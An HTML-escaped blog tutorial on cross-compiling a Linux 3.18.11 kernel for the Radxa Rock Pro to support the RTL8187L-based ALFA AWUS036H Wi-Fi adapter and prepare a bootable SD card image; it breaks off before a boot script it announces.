&amp;lt;p&amp;gt;When you’re done following this post, you should end up with a Rock Pro with the 3.18.11 Linux kernel, that loads it’s rootfs from the MicroSD card. &amp;lt;strong&amp;gt;Note that as far as I know, Rock Pro’s HDMI output is not supported on these new kernels (it didn’t work for me as well), so be sure you want don’t need your HDMI output before following this post.&amp;lt;&amp;#x2F;strong&amp;gt;&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Disclaimer: Most of the information in this post is taken from online posts, mainly from the &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;http:&amp;#x2F;&amp;#x2F;radxa.com&amp;#x2F;Rock&amp;#x2F;Linux_Mainline&amp;quot;&amp;gt;Radxa wiki&amp;lt;&amp;#x2F;a&amp;gt; and &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;http:&amp;#x2F;&amp;#x2F;www.cnx-software.com&amp;#x2F;2014&amp;#x2F;01&amp;#x2F;27&amp;#x2F;getting-started-with-raxda-rock-how-to-generate-and-flash-ubuntu-saucy-server-and-desktop-images&amp;#x2F;&amp;quot;&amp;gt;CNX-Software blog&amp;lt;&amp;#x2F;a&amp;gt;. This post is just my attempt of simplifying all of the online information, and documenting &amp;#x2F; solving some issues I had when I tried to follow the online instructions.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;alfa-awus036h&amp;quot;&amp;gt;ALFA AWUS036H&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;&amp;lt;img src=&amp;quot;&amp;#x2F;images&amp;#x2F;posts&amp;#x2F;compiling-new-kernel-for-radxa-rock-pro-rtl8187l-support&amp;#x2F;1.jpg&amp;quot; alt=&amp;quot;&amp;quot; &amp;#x2F;&amp;gt;
My target was to make the Radxa Rock Pro support ALFA AWUS036H’s monitor mode, and later on - airodump-ng and other similar tools. Sound simple!&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Since I had never heard of this network device until I started this project, I looked it up online and saw it is based on the famous Realtek RTL8187L chipset. Searching online also brought up that I should make the rtl8187l driver run on my Rock Pro device, and I’ll be done with this project.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;However, in order to compile a kernel module, I must have the running kernel + it’s configuration, and make sure it supports the Linux features required for the module to work (in this case - WIRELESS_EXT, MAC80211, …). After a few days of trying to compile the module with the pre-installed Radxa kernel from their site (3.0.36+ - &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;radxa&amp;#x2F;linux-rockchip&amp;quot;&amp;gt;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;radxa&amp;#x2F;linux-rockchip&amp;lt;&amp;#x2F;a&amp;gt;), I realised that I must use the upstream kernel, that already contains official rtl8187l module support, with my own configuration.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;pre-requirements&amp;quot;&amp;gt;Pre-Requirements&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;ul&amp;gt;
&amp;lt;li&amp;gt;Radxa Rock Pro&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;li&amp;gt;MicroSD Card (8GB+)&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;&amp;#x2F;ul&amp;gt;
&amp;lt;p&amp;gt;As the Radxa wiki says, you must own a Ubuntu 14.10 (or newer) Linux for the compilation process, along with GCC 4.9 or newer. When I tried to compile without these, I get an error from the precompiler stating that my compiler (GCC 4.8) has known issues when compiling the kernel, and that I should upgrade.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Of course, since we are compiling for the Radxa Rock Pro, you also need an environment including a cross compiler. You also need parted when creating the SD card image, and build-essential + libusb for rkflashtool. Run this installation line to install all dependencies before we start:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;sudo apt-get install build-essential gcc-arm-linux-gnueabihf lzop libncurses5-dev libssl-dev bc parted build-essential libusb-1.0-0-de
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;h2 id=&amp;quot;kernel-source&amp;quot;&amp;gt;Kernel Source&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;The Radxa wiki states you should clone the linux-next git repository and compile it for the Rock Pro. When I tried to do so and follow their steps - the compilation failed since the configuration was too old.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;&amp;lt;strong&amp;gt;Therefore, I recommend using the Linux 3.18.11 kernel, it worked out-of-the-box and didn’t require any code changes.&amp;lt;&amp;#x2F;strong&amp;gt; You can get it by running:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;wget https:&amp;#x2F;&amp;#x2F;www.kernel.org&amp;#x2F;pub&amp;#x2F;linux&amp;#x2F;kernel&amp;#x2F;v3.x&amp;#x2F;linux-3.18.11.tar.xz
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;tar xf linux-3.18.11.tar.xz
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;cd&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt; linux-3.18.11
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;After extracting the kernel, you should download the default Rock Pro configuration along with the .dts file, that will be used when booting (again, taken from Wiki):&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;wget http:&amp;#x2F;&amp;#x2F;rockchip.fr&amp;#x2F;radxa&amp;#x2F;linux&amp;#x2F;rockchip_defconfig -O arch&amp;#x2F;arm&amp;#x2F;configs&amp;#x2F;rockchip_defconfig
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;wget http:&amp;#x2F;&amp;#x2F;rockchip.fr&amp;#x2F;radxa&amp;#x2F;linux&amp;#x2F;rk3188-radxarock.dts -O arch&amp;#x2F;arm&amp;#x2F;boot&amp;#x2F;dts&amp;#x2F;rk3188-radxarock.dts
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;h2 id=&amp;quot;build-environment-configuration&amp;quot;&amp;gt;Build Environment Configuration&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;Before we start to mess with kernel compilations, we should make sure to always use the cross-compiler environment suitable for our device.&amp;lt;br &amp;#x2F;&amp;gt;
Run the following &amp;lt;strong&amp;gt;in each terminal you use in the compilation process&amp;lt;&amp;#x2F;strong&amp;gt; to set the build environment:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;export &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;ARCH&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;arm
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;export &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;CROSS_COMPILE&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;arm-linux-gnueabihf-
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;h2 id=&amp;quot;configuring-kernel&amp;quot;&amp;gt;Configuring Kernel&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;Copy the default Rock Pro configuration to the current configuration location:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;cp arch&amp;#x2F;arm&amp;#x2F;configs&amp;#x2F;rockchip_defconfig .config
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;And configure the kernel as you’d like by running:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;make menuconfig
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;(the menuconfig will use the .config we copied as the base for your changes). Since I’m describing my efforts to add support for the rtl8187l kernel module, the things I had to enable in the Kernel configuration are the following &amp;lt;strong&amp;gt;(the order is important!)&amp;lt;&amp;#x2F;strong&amp;gt;:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;&amp;lt;em&amp;gt;(You should navigate the menuconfig with the arrow keys and the space bar for selection. When selecting a feature, you can either mark it as built in &amp;amp;lt;*&amp;amp;gt;, kernel module &amp;amp;lt;M&amp;amp;gt; or unselected feature that will not be present in the kernel &amp;amp;lt; &amp;amp;gt;)&amp;lt;&amp;#x2F;em&amp;gt;&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;ul&amp;gt;
&amp;lt;li&amp;gt;Networking support -&amp;amp;gt; Wireless -&amp;amp;gt; Generic IEEE 802.11 Networking Stack (mac802111) (NEW) - &amp;lt;strong&amp;gt;set this to have &amp;amp;lt;*&amp;amp;gt; on the side (built-in kernel support)&amp;lt;&amp;#x2F;strong&amp;gt;&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;li&amp;gt;Device Drivers -&amp;amp;gt; Network device support -&amp;amp;gt; Wireless LAN -&amp;amp;gt; Realtek 8187 and 8187B USB support - &amp;lt;strong&amp;gt;set this to have &amp;amp;lt;M&amp;amp;gt; on the side (kernel module)&amp;lt;&amp;#x2F;strong&amp;gt;&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;&amp;#x2F;ul&amp;gt;
&amp;lt;p&amp;gt;Exit the menuconfig and choose &amp;amp;lt; Yes &amp;amp;gt; when asked whether to save the new configuration.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;The message &amp;lt;em&amp;gt;&amp;quot;configuration written to .config&amp;quot;&amp;lt;&amp;#x2F;em&amp;gt; should appear after saving. Now it’s time to compile our new configuration.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;compiling-the-kernel-modules&amp;quot;&amp;gt;Compiling the Kernel + Modules&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;Run the following commands:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;make prepare
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;make -j8 zImage dtbs
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;This will create 2 necessary files, zImage (the compressed kernel) and rk3188-radxarock.dtb (device tree blob, used at the Rock Pro boot).&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Now let’s compile the modules for later use:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;mkdir modules
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;export &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;INSTALL_MOD_PATH&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;.&amp;#x2F;modules
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;make modules
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;make modules_install
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;Now the &amp;quot;modules&amp;quot; directory is full with compiled kernel modules. We will use it later to build our SD card image.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;creating-boot-img&amp;quot;&amp;gt;Creating boot.img&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;Run the following commands to install Radxa mkbootimg:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;git clone https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;neo-technologies&amp;#x2F;rockchip-mkbootimg.git
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;cd&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt; rockchip-mkbootimg
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;make
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;sudo make install
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;cd&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt; ..
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;According to the wiki, we need to append the device tree blob to zImage (CONFIG_ARM_APPENDED_DTB option) until we can use U-Boot device tree support:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;cat arch&amp;#x2F;arm&amp;#x2F;boot&amp;#x2F;zImage arch&amp;#x2F;arm&amp;#x2F;boot&amp;#x2F;dts&amp;#x2F;rk3188-radxarock.dtb &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;gt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt; zImage-dtb
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;And after we have everything ready, make the boot.img out of the zImage-dtb:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;mkbootimg --kernel zImage-dtb --ramdisk &amp;#x2F;dev&amp;#x2F;null -o boot.img
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;My working &amp;amp;amp; ready boot.img is available for download &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;dl.dropboxusercontent.com&amp;#x2F;u&amp;#x2F;3819031&amp;#x2F;boot.img&amp;quot;&amp;gt;here&amp;lt;&amp;#x2F;a&amp;gt;.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;preparing-sd-card-image&amp;quot;&amp;gt;Preparing SD Card Image&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;When we’ll flash the kernel onto the Rock Pro, it will load and try to load the linux rootfs from the MicroSD card (you’ll see, when it’s part of the configuration that will be flashed in the next few steps).&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Therefore we should make an SD card image ready with all of the compatible binaries and the modules we have compiled earlier, including the rtl8187l module.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;To do that, we should start with an already ready SD card image, mount it’s ext4 partition locally on our Ubuntu and insert the kernel modules we built before.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;I used &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;http:&amp;#x2F;&amp;#x2F;dl.radxa.com&amp;#x2F;rock_pro&amp;#x2F;images&amp;#x2F;ubuntu&amp;#x2F;sd&amp;#x2F;radxa_rock_pro_ubuntu_14.04_server_k318rc5_141129_sdcard.zip&amp;quot;&amp;gt;this&amp;lt;&amp;#x2F;a&amp;gt; SD card image and did the following:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;cd&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt; ..
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;wget http:&amp;#x2F;&amp;#x2F;dl.radxa.com&amp;#x2F;rock_pro&amp;#x2F;images&amp;#x2F;ubuntu&amp;#x2F;sd&amp;#x2F;radxa_rock_pro_ubuntu_14.04_server_k318rc5_141129_sdcard.zip
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;unzip radxa_rock_pro_ubuntu_14.04_server_k318rc5_141129_sdcard.zip
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;After having the SD Card .img file, we need to find out where it’s ext4 partition starts in order to load it to our Ubuntu. We will do it using &amp;quot;parted&amp;quot; we installed in the pre-requirements:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;parted radxa_rock_pro_ubuntu_14.04_server_k318rc5_141129_sdcard.img
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;unit B
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;print
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;quit
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;You should see a table containing the start offset of the ext4 partition, which looks kind of like this:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot;&amp;gt;&amp;lt;code&amp;gt;&amp;lt;span&amp;gt;Number Start End Size Type File system Flags  
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;1 33554432B 1082130431B 1048576000B primary ext4
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;Use the start number we found before to mount the ext4 partition:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;mkdir ubuntu_sdcard
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;sudo mount -o offset=33554432 radxa_rock_pro_ubuntu_14.04_server_k318rc5_141129_sdcard.img ubuntu_sdcard
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;If everything went well, ubuntu_sdcard now points to the ext4 partition in the SD card image file. We should now copy the modules and firmware into the ext4 partition:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;sudo mkdir .&amp;#x2F;ubuntu_sdcard&amp;#x2F;lib&amp;#x2F;modules
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;sudo cp -r linux-3.18.11&amp;#x2F;modules&amp;#x2F;lib&amp;#x2F;modules&amp;#x2F;3.18.11&amp;#x2F; .&amp;#x2F;ubuntu_sdcard&amp;#x2F;lib&amp;#x2F;modules
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;sudo mkdir .&amp;#x2F;ubuntu_sdcard&amp;#x2F;lib&amp;#x2F;firmware
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;sudo cp -r linux-3.18.11&amp;#x2F;firmware&amp;#x2F;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;*&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt; .&amp;#x2F;ubuntu_sdcard&amp;#x2F;lib&amp;#x2F;firmware&amp;#x2F;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;Also, CNX-Software suggested (and I agree) to configure DHCP to the Ethernet port on boot:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;sudo vi .&amp;#x2F;ubuntu_sdcard&amp;#x2F;etc&amp;#x2F;network&amp;#x2F;interfaces
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;And add the following 2 lines:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot;&amp;gt;&amp;lt;code&amp;gt;&amp;lt;span&amp;gt;auto eth0 iface eth0 inet dhcp
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;Also, CNX-Software claims you need a script to detect rootfs at boot time. I used it, don’t know if it matters:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;sudo vi .&amp;#x2F;ubuntu_sdcard&amp;#x2F;usr&amp;#x2F;local&amp;#x2F;bin&amp;#x2F;mtd-by-name.sh
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;And copy the following into the file:&amp;lt;&amp;#x2F;p&amp;gt;
